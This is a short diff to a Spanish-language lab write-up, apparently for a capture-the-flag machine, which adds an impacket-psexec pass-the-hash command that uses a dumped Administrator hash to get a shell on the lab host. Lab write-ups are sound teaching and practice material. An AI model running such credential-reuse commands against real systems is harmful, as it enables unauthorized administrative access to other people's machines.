@@ -271,4 +271,5 @@ en este caso no usaremos la herramienta mimikatz debido a que Impacket-secretdum
 
 ### impacket-psexec
 con impacket-psexec podemos realizar un pass de hash utilizando el hash que hemos conseguido del usuario administrator 
+`Nota: impacket-psexec EGITISTICAL-BANCK.LOCAL/Administrator@10.10.10.175 -hashes :823452073d75b9d1cf70ebdf86c7f98e`
 ![[Pasted image 20240315002624.png]]
